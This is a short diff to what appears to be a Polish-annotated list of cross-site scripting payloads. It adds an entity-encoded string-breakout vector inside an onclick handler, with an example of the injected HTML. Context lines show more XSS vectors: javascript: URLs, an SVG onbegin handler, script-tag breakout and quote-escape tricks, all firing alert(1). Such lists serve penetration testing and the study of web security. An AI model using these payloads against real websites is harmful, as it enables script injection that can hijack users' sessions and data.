@@ -11,6 +11,8 @@ javascript:alert('You are hacked!')
 "><svg><animatetransform onbegin='alert(1);'>
 </script><script>alert(1)</script>
 \'-alert(1)//
+http://foo?&apos;-alert(1)-&apos;   (Przyklad po wstrzyknieciu [<a id="author" href="http://foo?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">asdf</a>])
+
 
 ***********************************************************************************************************************************************************
 [Wstrzykciecie w srodku zmiennej]
